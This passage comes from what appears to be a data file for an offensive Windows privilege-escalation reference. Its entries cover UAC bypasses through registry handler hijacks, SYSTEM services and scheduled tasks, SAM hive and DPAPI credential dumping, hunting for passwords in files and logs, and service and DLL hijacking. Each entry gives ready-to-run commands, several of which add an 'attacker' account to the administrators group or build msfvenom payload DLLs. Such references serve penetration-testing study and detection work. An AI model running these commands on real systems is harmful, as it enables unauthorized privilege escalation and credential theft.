    requires: ['Membership in Print Operators (grants SeLoadDriverPrivilege)'],
    opsec: 'Same as the SeLoadDriver path — driver-load events and the driver blocklist / HVCI may block it.',
    difficulty: 'hard',
  },
  {
    id: 'pe-event-log-readers',
    label: 'Event Log Readers',
    phase: 'hold',
    summary: 'Read Security / PowerShell logs for leaked credentials.',
    affects: 'All supported Windows / Server versions (depends on logging configuration).',
    description: r`Members of Event Log Readers can read the Security and PowerShell-Operational event logs. Where process-creation auditing or PowerShell script-block / module logging is enabled, those logs frequently contain credentials passed on command lines or embedded in scripts — harvest them and reuse the account.`,
    tools: [{ name: 'wevtutil (built-in)', url: 'https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil' }],
    commands: [
      { label: 'Search the Security log for passwords', code: r`wevtutil qe Security /f:text /rd:true /c:200 | findstr /i "password pass"`, lang: 'cmd' },
    ],
    mitre: mitre('T1552'),
    references: [{ label: 'OSCP/CPTS Notes — Event Log Readers', url: 'https://notes.dollarboysushil.com/windows-privilege-escalation/group-privileges/event-log-readers' }],
    requires: ['Membership in Event Log Readers', 'Credentials actually present in logged events'],
    opsec: 'Read-only and quiet; success depends entirely on whether logging captured a secret.',
    difficulty: 'medium',
  },
  {
    id: 'pe-account-operators',
    label: 'Account Operators',
    phase: 'hold',
    summary: 'Take over non-protected accounts; log on to DCs.',
    description: r`On a domain controller, Account Operators can create and modify users and groups that are NOT AdminSDHolder-protected (Domain Admins, the Operators groups, etc. are off-limits), and may log on locally to DCs. The path is indirect: reset the password of, or add yourself to, a delegated non-protected account or group that holds privileges (a custom admin group, an account with DCSync/GPO rights), then use those — rather than joining a protected group directly.`,
    tools: [{ name: 'net (built-in)', url: 'https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/net-user' }],
    mitre: mitre('T1098'),
    references: [{ label: 'kayssel — Account/Backup Operators & Event Log Readers', url: 'https://www.kayssel.com/post/interesting-groups-ad/' }],
    requires: ['Membership in Account Operators', 'A privileged NON-protected account or group to take over'],
    opsec: 'Password resets and group changes (Event ID 4724/4728/4732) are high-fidelity, and this is a domain-level change.',
    affects: 'All supported Windows Server versions (Active Directory).',
    difficulty: 'medium',
  },
  {
    id: 'pe-admins-filtered',
    label: 'Administrators (Filtered Token)',
    phase: 'hold',
    summary: 'You are admin, but UAC filters the token.',
    affects: 'All supported Windows versions with UAC enabled.',
    description: r`whoami /groups shows the local Administrators SID, but it is "deny-only" and your token runs at Medium integrity because of UAC. You already have the rights — you just need to unfilter the token. Continue in the Admin Users lane: a UAC bypass restores the high-integrity admin token, and from there any Admin → SYSTEM technique applies.`,
    mitre: mitre('T1548.002'),
    requires: ['Membership in local Administrators with a UAC-filtered token'],
    opsec: 'No action by itself — it routes to the UAC-bypass / admin-to-SYSTEM techniques.',
    difficulty: 'easy',
  },

  // ── UAC Bypass (medium → high integrity) ────────────────────────────────────
  {
    id: 'pe-uac-fodhelper',
    label: 'Fodhelper',
    phase: 'admin',
    summary: 'Auto-elevate fodhelper via an HKCU ms-settings handler.',
    affects: 'Windows 10 (all builds) and Windows 11 through 24H2, plus Server 2016 and later. Unpatched per UACME (method 33, works from build 10240); the most reliable registry-handler UAC bypass.',
    versions: [...range('win10-1507', 'win11-24h2'), 'srv2016', 'srv2019', 'srv2022', 'srv2025'],
    description: r`fodhelper.exe auto-elevates and reads HKCU\Software\Classes\ms-settings\shell\open\command (with DelegateExecute). Plant your command there and run fodhelper to execute at High integrity — no UAC prompt. Elevates an existing admin to High integrity; it does not turn a standard user into admin.`,
    tools: [{ name: 'UACMe', url: 'https://github.com/hfiref0x/UACME' }],
    commands: [
      { label: 'Set the hijack key', code: r`reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /d "cmd.exe" /f`, lang: 'cmd' },
      { label: 'Trigger elevation', code: r`fodhelper.exe`, lang: 'cmd' },
    ],
    mitre: mitre('T1548.002'),
    references: [{ label: 'PentestLab — UAC Bypass Fodhelper', url: 'https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/' }],
    requires: ['Member of local Administrators running at Medium integrity (default UAC)'],
    opsec: 'The HKCU ms-settings shell-open-command key + fodhelper spawning cmd is a widely-signatured detection. Clean up the key afterward.',
    difficulty: 'easy',
  },
  {
    id: 'pe-uac-eventvwr',
    label: 'Event Viewer (eventvwr)',
    phase: 'admin',
    summary: 'Hijack the mscfile handler eventvwr.exe auto-elevates.',
    affects: 'Legacy: Windows 7 – Windows 10 1607. Patched in the Creators Update (1703); does NOT work on modern builds.',
    versions: [...range('win7', 'win10-1607'), 'srv2008', 'srv2012', 'srv2016'],
    description: r`eventvwr.exe is an auto-elevating Microsoft-signed binary that opens its .msc snap-in via the HKCU\Software\Classes\mscfile\shell\open\command handler — checked before the HKLM one and never validated. A medium-integrity admin can point that key at an arbitrary command; launching eventvwr.exe then runs it at High integrity with no UAC prompt.`,
    tools: [{ name: 'UACMe', url: 'https://github.com/hfiref0x/UACME' }],
    commands: [
      { label: 'Set the hijack key', code: r`reg add "HKCU\Software\Classes\mscfile\shell\open\command" /d "cmd.exe" /f`, lang: 'cmd' },
      { label: 'Trigger elevation', code: r`eventvwr.exe`, lang: 'cmd' },
    ],
    mitre: mitre('T1548.002'),
    references: [{ label: 'enigma0x3 — Fileless UAC Bypass via eventvwr', url: 'https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/' }],
    requires: ['Member of local Administrators running at Medium integrity (default UAC)'],
    opsec: 'The HKCU mscfile shell-open-command key + eventvwr.exe spawning cmd is a classic, widely-signatured detection. Remove the key afterward.',
    difficulty: 'easy',
  },
  {
    id: 'pe-uac-sdclt',
    label: 'Sdclt',
    phase: 'admin',
    summary: 'Auto-elevating sdclt via the Folder/App Path handler.',
    affects: 'Legacy: Windows 10 1507–1607. Patched around 1803; does NOT work on modern builds.',
    versions: range('win10-1507', 'win10-1709'),
    description: r`sdclt.exe (Backup and Restore) auto-elevates and, on Windows 10, resolves a command through HKCU\Software\Classes\Folder\shell\open\command (or the App Paths key). Plant your command there and launch sdclt to run at High integrity with no prompt.`,
    tools: [{ name: 'UACMe', url: 'https://github.com/hfiref0x/UACME' }],
    commands: [
      { label: 'Set the hijack key', code: r`reg add "HKCU\Software\Classes\Folder\shell\open\command" /d "cmd.exe" /f
reg add "HKCU\Software\Classes\Folder\shell\open\command" /v DelegateExecute /t REG_SZ /f`, lang: 'cmd' },
      { label: 'Trigger', code: r`sdclt.exe`, lang: 'cmd' },
    ],
    mitre: mitre('T1548.002'),
    references: [{ label: 'PentestLab — UAC Bypass Sdclt', url: 'https://pentestlab.blog/2017/06/14/uac-bypass-sdclt/' }],
    requires: ['Member of local Administrators at Medium integrity'],
    opsec: 'HKCU Folder/command key + sdclt spawning cmd is signatured. Clean up afterward.',
    difficulty: 'easy',
  },
  {
    id: 'pe-uac-computerdefaults',
    label: 'ComputerDefaults',
    phase: 'admin',
    summary: 'Auto-elevating computerdefaults via ms-settings handler.',
    affects: 'Windows 10 1803 and later, Windows 11, and Server 2019 and later. Same ms-settings handler as fodhelper, but per UACME (method 62) the ComputerDefaults variant only works from build 1803, so Server 2016 is not affected.',
    versions: [...range('win10-1803', 'win11-24h2'), 'srv2019', 'srv2022', 'srv2025'],
    description: r`computerdefaults.exe auto-elevates and, like fodhelper, launches its target through the HKCU\Software\Classes\ms-settings\shell\open\command handler. Point that key at your command and run computerdefaults to execute at High integrity without a consent prompt.`,
    tools: [{ name: 'UACMe', url: 'https://github.com/hfiref0x/UACME' }],
    commands: [
      { label: 'Set the hijack key', code: r`reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /d "cmd.exe" /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ /f`, lang: 'cmd' },
      { label: 'Trigger', code: r`computerdefaults.exe`, lang: 'cmd' },
    ],
    mitre: mitre('T1548.002'),
    references: [{ label: 'MITRE T1548.002 — Bypass UAC', url: 'https://attack.mitre.org/techniques/T1548/002/' }],
    requires: ['Member of local Administrators at Medium integrity'],
    opsec: 'Shares the fodhelper ms-settings IOC; clean up the key.',
    difficulty: 'easy',
  },
  {
    id: 'pe-uac-cmstp',
    label: 'CMSTP / ICMLuaUtil',
    phase: 'admin',
    summary: 'Auto-elevate via the CMSTP elevated COM interface.',
    affects: 'Windows 7 – Windows 11; widely detected and partially mitigated on current builds.',
    description: r`This bypass abuses an auto-elevating COM object — the ICMLuaUtil "Elevated COM Interface" (CLSID {3E5FC7F9-9A51-4367-9063-A120244FBEC7}) — to run a command as a High-integrity process. Implemented by UACMe method 41 and several public scripts; needs no file on disk.`,
    tools: [{ name: 'UACMe', url: 'https://github.com/hfiref0x/UACME' }],
    mitre: mitre('T1218.003'),
    references: [{ label: 'MITRE T1218.003 — CMSTP', url: 'https://attack.mitre.org/techniques/T1218/003/' }],
    requires: ['Member of local Administrators at Medium integrity'],
    opsec: 'ICMLuaUtil instantiation and cmstp.exe activity are well-documented detections.',
    difficulty: 'medium',
  },
  {
    id: 'pe-uac-silentcleanup',
    label: 'SilentCleanup Task',
    phase: 'admin',
    summary: 'Abuse the auto-elevating SilentCleanup scheduled task.',
    affects: 'Windows 8 – Windows 11 (the SilentCleanup task ships on all).',
    versions: [...range('win8', 'win11-24h2'), 'srv2012', 'srv2016', 'srv2019', 'srv2022', 'srv2025'],
    description: r`The built-in SilentCleanup scheduled task runs "with highest privileges" yet is launchable by normal users. It executes cleanmgr.exe, which expands environment variables — by hijacking an environment variable (e.g. windir) in HKCU, the elevated task launches your binary at High integrity.`,
    tools: [{ name: 'UACMe', url: 'https://github.com/hfiref0x/UACME' }],
    commands: [
      { label: 'Run the task', code: r`schtasks /run /tn "\Microsoft\Windows\DiskCleanup\SilentCleanup" /i`, lang: 'cmd' },
    ],
    mitre: mitre('T1548.002'),
    references: [{ label: 'PentestLab — UAC Bypass Environment Variables', url: 'https://pentestlab.blog/2017/05/22/uac-bypass-environment-variables/' }],
    requires: ['Member of local Administrators at Medium integrity'],
    opsec: 'Environment-variable hijack in HKCU plus an elevated task spawning an odd child is detectable.',
    difficulty: 'medium',
  },

  // ── Admin → SYSTEM (high integrity → SYSTEM) ────────────────────────────────
  {
    id: 'pe-admin-service-system',
    label: 'SYSTEM Service (PsExec / sc create)',
    phase: 'admin',
    summary: 'Admin creates a service the SCM runs as SYSTEM.',
    affects: 'All supported Windows versions.',
    description: r`A high-integrity administrator can register a Windows service whose binary the Service Control Manager launches as LocalSystem. Do it by hand with sc create, or let PsExec -s or RunasCs spin up a transient service and hand back a SYSTEM shell. The default administrator-to-SYSTEM step.`,
    tools: [
      { name: 'PsExec (Sysinternals)', url: 'https://learn.microsoft.com/en-us/sysinternals/downloads/psexec' },
      { name: 'RunasCs', url: 'https://github.com/antonioCoco/RunasCs' },
    ],
    commands: [
      { label: 'PsExec SYSTEM shell', code: r`PsExec64.exe -accepteula -s -i cmd.exe`, lang: 'cmd' },
      { label: 'Manual service as SYSTEM', code: r`sc create svc binPath= "cmd /c C:\Temp\payload.exe" & sc start svc`, lang: 'cmd' },
    ],
    mitre: mitre('T1543.003'),
    references: [{ label: 'RunasCs', url: 'https://github.com/antonioCoco/RunasCs' }],
    requires: ['High-integrity administrator context'],
    opsec: 'Service creation (Event ID 7045) and PsExec named pipes are classic detections.',
    difficulty: 'easy',
  },
  {
    id: 'pe-admin-schtask-system',
    label: 'Scheduled Task as SYSTEM',
    phase: 'admin',
    summary: 'Register a task that runs as SYSTEM.',
    affects: 'All supported Windows versions.',
    description: r`As a high-integrity administrator, create a scheduled task whose principal is SYSTEM and run it immediately. schtasks /ru SYSTEM (or a task XML with the LocalSystem principal) executes your command as NT AUTHORITY\SYSTEM without installing a service.`,
    tools: [{ name: 'schtasks (built-in)', url: 'https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks' }],
    commands: [
      { label: 'Create + run a SYSTEM task', code: r`schtasks /create /tn sysT /tr "C:\Temp\payload.exe" /sc once /st 00:00 /ru SYSTEM /f
schtasks /run /tn sysT`, lang: 'cmd' },
    ],
    mitre: mitre('T1053.005'),
    requires: ['High-integrity administrator context'],
    opsec: 'Task creation (Event ID 4698) with a SYSTEM principal is a strong signal.',
    difficulty: 'easy',
  },
  {
    id: 'pe-admin-token',
    label: 'Token Impersonation (getsystem)',
    phase: 'admin',
    summary: 'Duplicate a SYSTEM process token.',
    affects: 'All supported Windows versions (token model).',
    description: r`A high-integrity administrator can enable SeDebugPrivilege, open a process already running as SYSTEM (e.g. winlogon.exe), duplicate its token, and spawn a new process with it — the technique behind Meterpreter getsystem and many C2 "make token" commands. Named-pipe impersonation (the classic getsystem pipe trick) achieves the same.`,
    tools: [{ name: 'Meterpreter (getsystem)', url: 'https://github.com/rapid7/metasploit-framework' }],
    mitre: mitre('T1134.001'),
    references: [{ label: 'MITRE T1134.001 — Token Impersonation', url: 'https://attack.mitre.org/techniques/T1134/001/' }],
    requires: ['High-integrity administrator context (to enable SeDebug)'],
    opsec: 'Opening winlogon/LSASS handles and token duplication are top-tier EDR detections.',
    difficulty: 'medium',
  },

  // ── Stored Credentials ──────────────────────────────────────────────────────
  {
    id: 'pe-sam-system-dump',
    label: 'SAM & SYSTEM Hive Dump',
    phase: 'finding',
    summary: 'Save SAM+SYSTEM, extract local hashes offline.',
    affects: 'All supported Windows versions (depends on read access to the hives).',
    description: r`Save the SAM and SYSTEM registry hives and process them offline to recover local NTLM hashes (the SYSTEM hive holds the bootkey that decrypts SAM). Note: reading these hives normally needs admin or SeBackup — listed here for the case where a misconfigured ACL or read privilege grants an unprivileged user access (see also HiveNightmare). A cracked or passed-the-hash local admin enables lateral movement.`,
    tools: [{ name: 'impacket-secretsdump', url: 'https://github.com/fortra/impacket' }],
    commands: [
      { label: 'Save hives', code: r`reg save HKLM\SAM C:\Temp\sam.hive
reg save HKLM\SYSTEM C:\Temp\system.hive`, lang: 'cmd' },
      { label: 'Dump offline', code: r`impacket-secretsdump -sam sam.hive -system system.hive LOCAL`, lang: 'bash' },
    ],
    mitre: mitre('T1003.002'),
    requires: ['Read access to SAM/SYSTEM — admin, SeBackup, or a misconfigured ACL'],
    opsec: 'reg save of SAM/SYSTEM is a known credential-dumping IOC. Offline parsing on the attacker host is invisible.',
    difficulty: 'easy',
  },
  {
    id: 'pe-dpapi-creds',
    label: 'DPAPI Secrets',
    phase: 'finding',
    summary: 'Decrypt DPAPI-protected creds/vaults with masterkeys.',
    affects: 'All supported Windows versions.',
    description: r`Windows Credential Manager entries, browser logins, and vaults are DPAPI-protected. With the user password (or SYSTEM access to the masterkey, or a domain DPAPI backup key) decrypt the masterkey, then the credential blobs. SharpDPAPI / mimikatz automate this.`,
    tools: [
      { name: 'SharpDPAPI', url: 'https://github.com/GhostPack/SharpDPAPI' },
      { name: 'mimikatz', url: 'https://github.com/gentilkiwi/mimikatz' },
    ],
    commands: [
      { label: 'Decrypt a masterkey (known password)', code: r`dpapi::masterkey /in:"%APPDATA%\Microsoft\Protect\<SID>\<GUID>" /sid:<SID> /password:<pw>`, lang: 'cmd' },
      { label: 'Decrypt a credential blob', code: r`dpapi::cred /in:"%LOCALAPPDATA%\Microsoft\Credentials\<blob>" /masterkey:<key>`, lang: 'cmd' },
    ],
    mitre: mitre('T1555.004'),
    references: [{ label: 'HackTricks — DPAPI Extracting Passwords', url: 'https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords.html' }],
    requires: ['User context / password, or SYSTEM, or the domain DPAPI backup key'],
    opsec: 'Reading masterkey + Credentials files and invoking DPAPI is detectable via file access patterns and known tool signatures.',
    difficulty: 'medium',
  },
  {
    id: 'pe-stored-creds',
    label: 'Saved Credentials (cmdkey)',
    phase: 'finding',
    summary: 'Reuse cmdkey-saved creds via runas /savecred.',
    affects: 'All supported Windows versions.',
    description: r`cmdkey /list reveals credentials saved in Credential Manager. If an admin credential is stored with /savecred, run commands as that user with runas /savecred without knowing the password — directly inheriting their privileges.`,
    tools: [
      { name: 'cmdkey (built-in)', url: 'https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey' },
      { name: 'runas (built-in)', url: 'https://ss64.com/nt/runas.html' },
    ],
    commands: [
      { label: 'List stored creds', code: r`cmdkey /list`, lang: 'cmd' },
      { label: 'Run as the saved (admin) user', code: r`runas /savecred /user:ADMIN "cmd /c net localgroup administrators attacker /add"`, lang: 'cmd' },
    ],
    mitre: mitre('T1555'),
    references: [{ label: 'HackingArticles — Stored Credentials (Runas)', url: 'https://www.hackingarticles.in/windows-privilege-escalation-stored-credentials-runas/' }],
    requires: ['A privileged credential stored via cmdkey /savecred'],
    opsec: 'Low-noise — uses built-in tools. The runas-spawned process tree under a different user is the main signal.',
    difficulty: 'easy',
  },
  {
    id: 'pe-winlogon-autologon',
    label: 'Winlogon Autologon',
    phase: 'finding',
    summary: 'Read a cleartext autologon password from the registry.',
    affects: 'All supported Windows versions (only when autologon is configured).',
    description: r`When automatic logon is configured, Windows stores the account name and its password in cleartext under the Winlogon registry key (DefaultUserName / DefaultPassword, with AutoAdminLogon = 1). Any user can read these values — if the autologon account is a local or domain admin, you have its password directly, no cracking required.`,
    tools: [{ name: 'reg (built-in)', url: 'https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/reg' }],
    commands: [
      { label: 'Read the autologon values', code: r`reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword`, lang: 'cmd' },
    ],
    mitre: mitre('T1552.002'),
    references: [{ label: 'MITRE T1552.002 — Credentials in Registry', url: 'https://attack.mitre.org/techniques/T1552/002/' }],
    requires: ['Autologon configured with a stored DefaultPassword'],
    opsec: 'Read-only registry query — very quiet. The password is only present when autologon is actually configured.',
    difficulty: 'easy',
  },
  {
    id: 'pe-hivenightmare',
    label: 'HiveNightmare / SeriousSAM',
    phase: 'finding',
    summary: 'CVE-2021-36934 — any user reads SAM via a shadow copy.',
    affects: 'Windows 10 1809–21H1, Windows 11 21H2, and Server 2019 / 2022, pre-patch (patched Aug 2021).',
    versions: [...range('win10-1809', 'win10-21h1'), 'win11-21h2', 'srv2019', 'srv2022'],
    description: r`On affected Windows 10/11 builds the ACLs on C:\Windows\System32\config\SAM, SYSTEM and SECURITY mistakenly granted BUILTIN\Users read access. A non-admin can read these hives out of a Volume Shadow Copy and extract the local-admin hash offline — no SeBackup, no admin token required. Mitigated by patching, fixing the ACLs, and deleting existing shadow copies.`,
    tools: [
      { name: 'impacket-secretsdump', url: 'https://github.com/fortra/impacket' },
      { name: 'HiveNightmare PoC', url: 'https://github.com/GossiTheDog/HiveNightmare' },
    ],
    commands: [
      { label: 'Confirm the over-permissive ACL', code: r`icacls C:\Windows\System32\config\SAM`, lang: 'cmd' },
      { label: 'Read hives from a shadow copy + dump', code: r`impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL`, lang: 'bash' },
    ],
    mitre: mitre('T1003.002'),
    references: [{ label: 'MSRC — CVE-2021-36934', url: 'https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36934' }],
    requires: ['Unpatched vulnerable build', 'At least one VSS shadow copy present'],
    opsec: 'Reading the hives is low-noise; it depends on a shadow copy existing. Fully patched/mitigated systems are not affected.',
    difficulty: 'easy',
  },
  {
    id: 'pe-powershell-history',
    label: 'PowerShell History',
    phase: 'finding',
    summary: 'Read PSReadLine command history for secrets.',
    affects: 'All supported Windows versions with PowerShell 5+ / PSReadLine.',
    description: r`PSReadLine saves every PowerShell command to ConsoleHost_history.txt in the user profile, readable by that user. Administrators routinely paste passwords, connection strings, and API keys into PowerShell, so the history file is a reliable, no-privilege credential source.`,
    tools: [{ name: 'WinPEAS', url: 'https://github.com/peass-ng/PEASS-ng' }],
    commands: [
      { label: 'Read the history file', code: r`type "%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"`, lang: 'cmd' },
      { label: 'All readable users', code: r`gc C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`, lang: 'powershell' },
    ],
    mitre: mitre('T1552.001'),
    references: [{ label: 'MITRE T1552.001 — Credentials In Files', url: 'https://attack.mitre.org/techniques/T1552/001/' }],
    requires: ['A PowerShell history file containing a secret'],
    opsec: 'Read-only and very quiet; depends on a user having typed a secret.',
    difficulty: 'easy',
  },
  {
    id: 'pe-config-password-hunt',
    label: 'Files & Configs with Secrets',
    phase: 'finding',
    summary: 'Hunt secrets across configs, scripts, and user artifacts.',
    affects: 'All supported Windows versions (some artifact paths, e.g. Sticky Notes / Notepad tabs, vary by build).',
    description: r`Credentials hide all over the filesystem: unattended-install files (Unattend.xml, sysprep, Autounattend.xml under C:\Windows\Panther\), application configs (web.config, *.config, appsettings.json), scripts and .bat/.ps1 files, and user artifacts — the Recycle Bin, Sticky Notes (plum.sqlite), unsaved Notepad tabs (Windows 11 TabState), and custom config files. Grep broadly for password/key patterns; winPEAS and LaZagne automate most of these locations.`,
    tools: [
      { name: 'WinPEAS', url: 'https://github.com/peass-ng/PEASS-ng' },
      { name: 'LaZagne', url: 'https://github.com/AlessandroZ/LaZagne' },
    ],
    commands: [
      { label: 'Recursive password grep', code: r`findstr /si password *.xml *.ini *.txt *.config *.json`, lang: 'cmd' },
      { label: 'Unattend / sysprep files', code: r`dir /s /b C:\Windows\Panther\Unattend.xml C:\Windows\System32\sysprep\*.xml`, lang: 'cmd' },
      { label: 'Sticky Notes store', code: r`dir /s C:\Users\*\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_*\LocalState\plum.sqlite`, lang: 'cmd' },
    ],
    mitre: mitre('T1552.001'),
    references: [
      { label: 'MITRE T1552.001 — Credentials In Files', url: 'https://attack.mitre.org/techniques/T1552/001/' },
      { label: 'LaZagne', url: 'https://github.com/AlessandroZ/LaZagne' },
    ],
    requires: ['Readable files that contain credentials'],
    opsec: 'Read-only hunting is quiet; broad recursive searches can be noisy on disk-access auditing.',
    difficulty: 'easy',
  },
  {
    id: 'pe-password-managers',
    label: 'Password Managers & Browsers',
    phase: 'finding',
    summary: 'Loot KeePass / browser stores for saved logins.',
    affects: 'Depends on the installed application, not the Windows build.',
    description: r`Locally stored vaults are high-value: KeePass .kdbx databases (and the KeePass 2.x CVE-2023-32784 master-password memory leak), browser-saved logins (Chrome/Edge "Login Data" SQLite, DPAPI-protected), and config files for other managers. LaZagne pulls credentials from dozens of such apps in one pass.`,
    tools: [
      { name: 'LaZagne', url: 'https://github.com/AlessandroZ/LaZagne' },
      { name: 'KeePass CVE-2023-32784 PoC', url: 'https://github.com/vdohney/keepass-password-dumper' },
    ],
    commands: [
      { label: 'Find KeePass databases', code: r`dir /s /b C:\Users\*.kdbx`, lang: 'cmd' },
      { label: 'LaZagne — all modules', code: r`lazagne.exe all`, lang: 'cmd' },
    ],
    mitre: mitre('T1555.005'),
    references: [{ label: 'MITRE T1555.005 — Password Managers', url: 'https://attack.mitre.org/techniques/T1555/005/' }],
    requires: ['A local vault/browser store and its key or master password'],
    opsec: 'Reading browser/KeePass files is quiet; LaZagne is AV-signatured.',
    difficulty: 'medium',
  },

  // ── Service Misconfigurations ───────────────────────────────────────────────
  {
    id: 'pe-unquoted-service-path',
    label: 'Unquoted Service Path',
    phase: 'finding',
    summary: 'Plant a binary along an unquoted, space-containing service path.',
    affects: 'All supported Windows versions (configuration weakness).',
    description: r`When a service ImagePath contains spaces and is not wrapped in quotes (e.g. C:\Program Files\My App\svc.exe), Windows tries each space-delimited prefix as an executable — C:\Program.exe, then C:\Program Files\My.exe, and so on. If you can write to one of those intermediate directories, drop a malicious binary there and it runs as the service account on next start.`,
    tools: [
      { name: 'WinPEAS', url: 'https://github.com/peass-ng/PEASS-ng' },
      { name: 'PowerUp', url: 'https://github.com/PowerShellMafia/PowerSploit' },
    ],
    commands: [
      { label: 'Find unquoted paths with spaces', code: r`Get-WmiObject win32_service | ? { $_.PathName -notlike '"*' -and $_.PathName -like '* *' } | select Name, PathName`, lang: 'powershell' },
      { label: 'Restart the service to trigger', code: r`sc stop <service> & sc start <service>`, lang: 'cmd' },
    ],
    mitre: mitre('T1574.009'),
    requires: ['Service with an unquoted path + space', 'Write access to an intermediate directory', 'Ability to restart the service or reboot'],
    opsec: 'A new EXE in an unusual path + service crash/restart events are detectable. The service runs your binary as its (often SYSTEM) account.',
    difficulty: 'medium',
  },
  {
    id: 'pe-weak-service-perms',
    label: 'Weak Service Permissions (binPath)',
    phase: 'finding',
    summary: 'Reconfigure a modifiable service binPath to your command.',
    affects: 'All supported Windows versions (configuration weakness).',
    description: r`If your user holds SERVICE_CHANGE_CONFIG (or SERVICE_ALL_ACCESS) on a SYSTEM service, rewrite its binPath to an arbitrary command, then restart it. The Service Control Manager launches your command as the service account (typically LocalSystem). Find these with accesschk or SharpUp.`,
    tools: [
      { name: 'SharpUp', url: 'https://github.com/GhostPack/SharpUp' },
      { name: 'accesschk (Sysinternals)', url: 'https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk' },
    ],
    commands: [
      { label: 'Enumerate modifiable services', code: r`accesschk.exe -uwcqv "Users" * /accepteula`, lang: 'cmd' },
      { label: "Hijack binPath (note the space after '=')", code: r`sc config <service> binpath= "net localgroup administrators attacker /add"`, lang: 'cmd' },
      { label: 'Trigger', code: r`sc stop <service> & sc start <service>`, lang: 'cmd' },
    ],
    mitre: mitre('T1543.003'),
    requires: ['SERVICE_CHANGE_CONFIG / SERVICE_ALL_ACCESS on a privileged service', 'Ability to start/stop it'],
    opsec: 'sc config changes and the service failing to return a control response are logged. The command still executes before the SCM errors out.',
    difficulty: 'easy',
  },
  {
    id: 'pe-insecure-service-binary',
    label: 'Writable Service Binary',
    phase: 'finding',
    summary: 'Overwrite a service EXE you can write to.',
    affects: 'All supported Windows versions (configuration weakness).',
    description: r`If the on-disk service executable (or its containing folder) is writable by your user but the service runs as SYSTEM, replace the binary with your payload and restart the service. Distinct from binPath abuse — here the misconfiguration is filesystem ACLs on the EXE rather than the service config.`,
    tools: [
      { name: 'accesschk (Sysinternals)', url: 'https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk' },
      { name: 'PowerUp', url: 'https://github.com/PowerShellMafia/PowerSploit' },
    ],
    commands: [
      { label: 'Check write access to a service binary', code: r`accesschk.exe -quvw "Users" "C:\Path\To\service.exe" /accepteula`, lang: 'cmd' },
      { label: 'Replace and restart', code: r`copy /y payload.exe "C:\Path\To\service.exe" & sc stop <service> & sc start <service>`, lang: 'cmd' },
    ],
    mitre: mitre('T1574.010'),
    requires: ['Write/modify permission on the service EXE or its directory', 'Service runs as SYSTEM/elevated', 'Ability to restart it'],
    opsec: 'File-modification + service-restart events. Back up the original binary to restore the service afterward.',
    difficulty: 'easy',
  },
  {
    id: 'pe-weak-registry-service',
    label: 'Weak Service Registry Perms',
    phase: 'finding',
    summary: 'Rewrite a service ImagePath via a writable registry key.',
    affects: 'All supported Windows versions (configuration weakness).',
    description: r`If your user can write to a service key under HKLM\SYSTEM\CurrentControlSet\Services (even without service-config rights via the SCM), modify the ImagePath value to point at your binary. On next start the SYSTEM service launches your executable. Enumerate writable service keys with accesschk -k.`,
    tools: [{ name: 'accesschk (Sysinternals)', url: 'https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk' }],
    commands: [
      { label: 'Find writable service keys', code: r`accesschk.exe -kvuqsw hklm\System\CurrentControlSet\Services /accepteula`, lang: 'cmd' },
      { label: 'Overwrite ImagePath', code: r`reg add HKLM\SYSTEM\CurrentControlSet\Services\<svc> /v ImagePath /t REG_EXPAND_SZ /d "C:\Temp\payload.exe" /f`, lang: 'cmd' },
    ],
    mitre: mitre('T1574.011'),
    requires: ['Write access to a service registry key', 'Ability to restart the service or reboot'],
    opsec: 'Registry modification of ImagePath on a service key is a high-fidelity detection. Restore the value after exploiting.',
    difficulty: 'medium',
  },

  // ── DLL & PATH Hijacking ────────────────────────────────────────────────────
  {
    id: 'pe-service-dll-hijack',
    label: 'Service DLL Hijacking',
    phase: 'finding',
    summary: 'Plant a DLL a privileged service loads from a writable path.',
    affects: 'All supported Windows versions (depends on the service).',
    description: r`A SYSTEM service that searches for a DLL by name and finds it in a writable, earlier search-order location (or a missing 'phantom' DLL) will load attacker code into its process. Identify the missing/hijackable module (e.g. with Process Monitor) and drop a matching DLL whose DllMain runs your payload.`,
    tools: [
      { name: 'Process Monitor (Sysinternals)', url: 'https://learn.microsoft.com/en-us/sysinternals/downloads/procmon' },
      { name: 'msfvenom (Metasploit)', url: 'https://github.com/rapid7/metasploit-framework' },
    ],
    commands: [
      { label: 'Generate an x64 add-admin DLL', code: r`msfvenom -p windows/x64/exec cmd='net localgroup administrators attacker /add' -f dll -o hijack.dll`, lang: 'bash' },
    ],
    mitre: mitre('T1574.001'),
    requires: ['Privileged service that loads a DLL from a writable / missing path', 'Ability to restart it'],
    opsec: 'An unsigned DLL loaded by a signed service binary from a user-writable directory (Sysmon Event ID 7) is a strong detection signal.',
    difficulty: 'medium',
  },
  {
    id: 'pe-path-dll-hijack',
    label: 'Writable %PATH% Directory',
    phase: 'finding',
    summary: 'Plant a DLL a privileged service resolves by name from %PATH%.',
    affects: 'All supported Windows versions (depends on a writable PATH entry).',
    description: r`If a directory listed in the system PATH is writable by your user, any privileged process or service that loads a DLL by bare name (no full path) can resolve it from your writable directory if it precedes the legitimate one in the search order. Drop a matching DLL whose DllMain runs your payload; it loads into the privileged process. Distinct from a per-app DLL hijack — here the weakness is a globally writable PATH entry.`,
    tools: [
